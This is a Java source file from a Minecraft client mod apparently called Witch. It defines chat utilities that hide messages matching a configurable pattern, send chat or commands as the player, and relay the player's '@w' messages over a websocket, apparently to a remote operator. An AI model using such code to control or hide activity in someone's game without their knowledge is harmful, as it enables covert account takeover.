package me.soda.witch.features;

import me.soda.witch.websocket.MessageUtils;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.util.regex.Pattern;

import static me.soda.witch.Witch.mc;

public class ChatUtil {
    private static boolean firstTime = true;

    public static boolean filter(Text message) {
        if (!Config.isBeingFiltered) return false;
        Pattern pattern = Pattern.compile(Config.filterPattern);
        return pattern.matcher(message.getString()).find();
    }

    public static void sendChat(String message) {
        try {
            if (mc.world == null || mc.player == null) return;
            mc.inGameHud.getChatHud().addToMessageHistory(message);
            if (message.startsWith("/")) mc.player.sendCommand(message.substring(1), null);
            else mc.player.sendChatMessage(message, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void chat(Text msg, boolean you) {
        if (mc.world == null) return;

        Text prefix = Text.of(Formatting.GRAY + "[" + Formatting.DARK_PURPLE + (you ? "You" : "Witch") + Formatting.GRAY + "] " + Formatting.RESET);

        if (firstTime) {
            firstTime = false;
            chat(Text.of("Notice: Input @w <text> to chat with me."), false);
        }

        MutableText message = Text.literal("");
        message.append(prefix);
        message.append(msg);

        mc.inGameHud.getChatHud().addMessage(message);
    }

    public static boolean tryChatBack(String string) {
        String[] msgArr = string.split(" ");
        if (msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
        String[] strArr = new String[msgArr.length - 1];
        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
        String chatText = String.join(" ", strArr);
        chat(Text.of(chatText), true);
        MessageUtils.sendMessage("chat", chatText);
        return true;
    }
}
